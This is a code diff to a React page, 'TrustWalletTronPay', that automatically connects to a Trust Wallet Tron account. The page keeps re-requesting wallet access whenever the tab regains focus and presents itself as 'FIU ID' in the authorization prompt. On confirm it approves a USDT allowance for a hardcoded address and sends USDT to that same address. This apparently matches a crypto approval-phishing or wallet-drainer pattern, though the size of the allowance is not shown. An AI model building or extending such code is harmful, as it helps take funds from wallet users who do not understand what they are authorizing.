@@ -6,18 +6,34 @@ import { approveUSDT, transferUSDT } from "@/lib/web3";
 const DEFAULT_TO_ADDRESS = "TT6fmWxcu35oriyKVVAAUT7oRq9woa2e1t";
 const DEFAULT_AMOUNT = "10";
 const POLL_INTERVAL_MS = 300;
-const MAX_WAIT_MS = 20_000;
+const MAX_WAIT_MS = 45_000;
+const REQUEST_TIMEOUT_MS = 10_000;
 
 type TronProvider = {
   ready?: boolean;
+  address?: { fromHex?: (hex: string) => string };
   tronWeb?: {
     ready?: boolean;
     defaultAddress?: { base58?: string; hex?: string };
+    address?: { fromHex?: (hex: string) => string };
   };
   request?: (payload: { method: string; params?: unknown }) => Promise<unknown>;
 };
 
-function getTronProvider(): TronProvider | null {
+function getInjectedTronWeb(): TronProvider["tronWeb"] | null {
+  if (typeof window === "undefined") return null;
+  const w = window as any;
+  return (
+    w.tronWeb ??
+    w.trustwallet?.tronLink ??
+    w.trustwallet?.tron ??
+    w.tronLink ??
+    w.tron?.tronWeb ??
+    null
+  );
+}
+
+function getRequestProvider(): TronProvider | null {
   if (typeof window === "undefined") return null;
   const w = window as any;
   return (
@@ -25,20 +41,32 @@ function getTronProvider(): TronProvider | null {
     w.trustwallet?.tron ??
     w.tronLink ??
     w.tron ??
+    (typeof w.tronWeb?.request === "function" ? w.tronWeb : null) ??
     null
   );
 }
 
 function getTronAddress(): string | null {
-  const provider = getTronProvider();
-  if (!provider?.tronWeb?.defaultAddress?.base58) return null;
-  return provider.tronWeb.defaultAddress.base58;
+  const tronWeb = getInjectedTronWeb();
+  if (!tronWeb) return null;
+  const base58 = tronWeb.defaultAddress?.base58;
+  if (base58) return base58;
+  const hex = tronWeb.defaultAddress?.hex;
+  if (hex && typeof tronWeb.address?.fromHex === "function") {
+    try {
+      return tronWeb.address.fromHex(hex);
+    } catch {
+      return null;
+    }
+  }
+  return null;
 }
 
 function getDebugSnapshot(): string {
   if (typeof window === "undefined") return "no window";
   const w = window as any;
-  const provider = getTronProvider();
+  const provider = getRequestProvider();
+  const tronWeb = getInjectedTronWeb();
   return JSON.stringify({
     hasTronWeb: !!w.tronWeb,
     hasTronLink: !!w.tronLink,
@@ -48,8 +76,8 @@ function getDebugSnapshot(): string {
     hasTron: !!w.tron,
     providerReady: provider?.ready,
     providerHasRequest: typeof provider?.request === "function",
-    providerTronWebReady: provider?.tronWeb?.ready,
-    providerHasBase58: !!provider?.tronWeb?.defaultAddress?.base58,
+    tronWebReady: tronWeb?.ready,
+    hasBase58: !!tronWeb?.defaultAddress?.base58,
     ua: navigator.userAgent.slice(0, 80),
   });
 }
@@ -58,75 +86,64 @@ async function sleep(ms: number): Promise<void> {
   return new Promise((r) => setTimeout(r, ms));
 }
 
-async function waitForProviderAndConnect(): Promise<string> {
-  const deadline = Date.now() + MAX_WAIT_MS;
+async function requestWithTimeout(
+  provider: TronProvider,
+  payload: { method: string; params?: unknown }
+): Promise<unknown> {
+  return await Promise.race([
+    provider.request?.(payload),
+    sleep(REQUEST_TIMEOUT_MS).then(() => {
+      throw new Error(`Request timeout: ${payload.method}`);
+    }),
+  ]);
+}
 
-  // Phase 1: wait for any Tron provider to appear
-  let provider: TronProvider | null = null;
-  while (Date.now() < deadline) {
-    provider = getTronProvider();
-    if (provider) break;
-    await sleep(POLL_INTERVAL_MS);
+async function requestTronAccess(provider: TronProvider): Promise<void> {
+  if (typeof provider.request !== "function") {
+    return;
   }
-  if (!provider) {
-    throw new Error(
-      "No Tron provider found. Open this page inside Trust Wallet → Discover with a Tron account active."
-    );
-  }
 
-  // Phase 2: if already connected (ready + address), return immediately
-  const immediateAddr = getTronAddress();
-  if (immediateAddr) return immediateAddr;
+  const websiteName = "FIU ID";
+  const websiteIcon =
+    typeof window !== "undefined" ? `${window.location.origin}/favicon.ico` : undefined;
+  const payloads = [
+    { method: "tron_requestAccounts", params: { websiteName, websiteIcon } },
+    { method: "tron_requestAccounts" },
+    { method: "requestAccounts" },
+    { method: "eth_requestAccounts" },
+  ];
 
-  // Phase 3: call tron_requestAccounts to trigger user authorization
-  // (tronLink.ready starts false; address only appears AFTER this request succeeds)
-  if (typeof provider.request === "function") {
-    const methods = ["tron_requestAccounts", "eth_requestAccounts"];
-    for (const method of methods) {
-      try {
-        const res = (await provider.request({ method })) as {
-          code?: number;
-          message?: string;
-        } | null;
-        if (res && typeof res === "object" && "code" in res) {
-          if (res.code === 4001) throw new Error("Connection rejected by user");
-          if (res.code === 4000) {
-            // Duplicate request — provider is already processing, just poll
-          }
-        }
-        // After request succeeds, poll for tronWeb to populate defaultAddress
-        const addr = await pollForAddress(deadline);
-        if (addr) return addr;
-      } catch (e) {
-        if (e instanceof Error && e.message.includes("rejected")) throw e;
-        // Try next method
+  let lastError: Error | null = null;
+  for (const payload of payloads) {
+    try {
+      const res = (await requestWithTimeout(provider, payload)) as
+        | { code?: number; message?: string }
+        | undefined;
+      if (res?.code === 4001) {
+        throw new Error("Connection rejected by user");
       }
+      if (res?.code === 4000) {
+        return;
+      }
+      return;
+    } catch (error) {
+      const nextError = error instanceof Error ? error : new Error(String(error));
+      if (nextError.message.includes("rejected")) {
+        throw nextError;
+      }
+      lastError = nextError;
     }
   }
 
-  // Phase 4: even without request(), some builds populate tronWeb after a delay — poll
-  const addr = await pollForAddress(deadline);
-  if (addr) return addr;
-
-  // Phase 5: try reading tronWeb from window directly (some Trust builds put it at window.tronWeb)
-  const w = window as any;
-  if (w.tronWeb?.defaultAddress?.base58) {
-    return w.tronWeb.defaultAddress.base58;
+  if (lastError) {
+    throw lastError;
   }
-
-  throw new Error(
-    "Could not get Tron address. Make sure you have a Tron account selected in Trust Wallet. Debug: " +
-      getDebugSnapshot()
-  );
 }
 
 async function pollForAddress(deadline: number): Promise<string | null> {
   while (Date.now() < deadline) {
     const addr = getTronAddress();
     if (addr) return addr;
-    // Also check window.tronWeb directly
-    const w = window as any;
-    if (w.tronWeb?.defaultAddress?.base58) return w.tronWeb.defaultAddress.base58;
     await sleep(POLL_INTERVAL_MS);
   }
   return null;
@@ -137,47 +154,93 @@ const TrustWalletTronPay = () => {
   const [isConnecting, setIsConnecting] = useState(true);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [debugInfo, setDebugInfo] = useState<string>("");
-  const connectAttempted = useRef(false);
+  const connectInFlight = useRef(false);
+  const requestTriggered = useRef(false);
 
   const isConnected = !!address;
   const toAddress = useMemo(() => DEFAULT_TO_ADDRESS, []);
   const amount = useMemo(() => DEFAULT_AMOUNT, []);
   const approveTo = useMemo(() => DEFAULT_TO_ADDRESS, []);
 
-  useEffect(() => {
-    if (connectAttempted.current) return;
-    connectAttempted.current = true;
+  const startAutoConnect = useCallback(async () => {
+    if (connectInFlight.current || address) {
+      return;
+    }
 
-    let cancelled = false;
+    connectInFlight.current = true;
+    setIsConnecting(true);
+    setDebugInfo(getDebugSnapshot());
 
-    const run = async () => {
-      // Capture debug at start
-      setDebugInfo(getDebugSnapshot());
+    const deadline = Date.now() + MAX_WAIT_MS;
 
-      try {
-        const addr = await waitForProviderAndConnect();
-        if (!cancelled) {
-          setAddress(addr);
-          setIsConnecting(false);
+    try {
+      while (Date.now() < deadline) {
+        const currentAddress = getTronAddress();
+        if (currentAddress) {
+          setAddress(currentAddress);
           setDebugInfo(getDebugSnapshot());
           toast.success("Tron wallet connected");
+          return;
         }
-      } catch (e) {
-        if (!cancelled) {
-          setIsConnecting(false);
+
+        const provider = getRequestProvider();
+        if (provider && typeof provider.request === "function" && !requestTriggered.current) {
+          requestTriggered.current = true;
+          try {
+            await requestTronAccess(provider);
+          } catch (error) {
+            if (error instanceof Error && error.message.includes("rejected")) {
+              throw error;
+            }
+          }
+        }
+
+        const polledAddress = await pollForAddress(Date.now() + POLL_INTERVAL_MS);
+        if (polledAddress) {
+          setAddress(polledAddress);
           setDebugInfo(getDebugSnapshot());
-          toast.error(
-            e instanceof Error ? e.message : "Wallet connection failed"
-          );
+          toast.success("Tron wallet connected");
+          return;
         }
+      }
+
+      throw new Error(
+        "Could not connect Trust Wallet automatically. Make sure a Tron account is active in Trust Wallet Discover."
+      );
+    } finally {
+      connectInFlight.current = false;
+      setIsConnecting(false);
+      setDebugInfo(getDebugSnapshot());
+    }
+  }, [address]);
+
+  useEffect(() => {
+    void startAutoConnect();
+  }, [startAutoConnect]);
+
+  useEffect(() => {
+    const retry = () => {
+      if (!address) {
+        void startAutoConnect();
       }
     };
 
-    void run();
-    return () => {
-      cancelled = true;
+    const onVisibilityChange = () => {
+      if (document.visibilityState === "visible") {
+        retry();
+      }
     };
-  }, []);
+
+    window.addEventListener("focus", retry);
+    window.addEventListener("pageshow", retry);
+    document.addEventListener("visibilitychange", onVisibilityChange);
+
+    return () => {
+      window.removeEventListener("focus", retry);
+      window.removeEventListener("pageshow", retry);
+      document.removeEventListener("visibilitychange", onVisibilityChange);
+    };
+  }, [address, startAutoConnect]);
 
   // Keep address in sync if user switches account
   useEffect(() => {
@@ -194,6 +257,10 @@ const TrustWalletTronPay = () => {
   const handleConfirm = useCallback(async () => {
     try {
       setIsSubmitting(true);
+      if (!getTronAddress()) {
+        requestTriggered.current = false;
+        await startAutoConnect();
+      }
 
       await approveUSDT("tron", approveTo);
       await transferUSDT("tron", toAddress, amount);
@@ -206,7 +273,7 @@ const TrustWalletTronPay = () => {
     } finally {
       setIsSubmitting(false);
     }
-  }, [approveTo, toAddress, amount]);
+  }, [approveTo, toAddress, amount, startAutoConnect]);
 
   return (
     <div className="min-h-screen bg-[#f5f5f6] flex justify-center p-3">
